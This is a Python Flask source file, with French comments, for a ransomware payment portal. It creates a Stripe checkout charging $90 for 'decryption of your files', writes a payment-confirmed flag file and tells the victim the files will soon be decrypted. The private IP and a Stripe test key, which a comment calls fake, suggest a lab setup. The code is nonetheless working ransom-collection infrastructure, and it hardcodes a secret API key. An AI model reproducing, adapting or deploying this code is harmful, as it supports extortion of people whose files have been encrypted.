import stripe
from flask import Flask, redirect, request

app = Flask(__name__)

# Clé API Stripe factice (ne fait aucun vrai paiement)
stripe.api_key = "sk_test_51MsBzDJw4s8JQ1IAR5F2NcbXUzafTsfQ8xaUYxFkPqCTm0s458ywcKxoQHd12TIkg1W81j7MJZ4VBUdBUXeU1nTm008qErskHj"

@app.route("/pay")
def create_checkout_session():
    try:
        session = stripe.checkout.Session.create(
            payment_method_types=["card"],
            line_items=[{
                "price_data": {
                    "currency": "usd",
                    "product_data": {
                        "name": "Déchiffrement de vos fichiers",
                    },
                    "unit_amount": 9000,
                },
                "quantity": 1,
            }],
            mode="payment",
            success_url="http://192.168.198.200:4242/success",
            cancel_url="http://192.168.198.200:4242/cancel",
        )
        return redirect(session.url, code=303)
    except Exception as e:
        return f"Erreur lors de la création du paiement : {str(e)}", 500

@app.route("/success")
def success():
    with open("payment_confirmed.txt", "w") as f:
        f.write("PAIEMENT_OK")
    return "✅ Paiement réussi. Vos fichiers seront bientôt déchiffrés."

@app.route("/cancel")
def cancel():
    return "❌ Paiement annulé. Vous pouvez réessayer à tout moment."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4242)
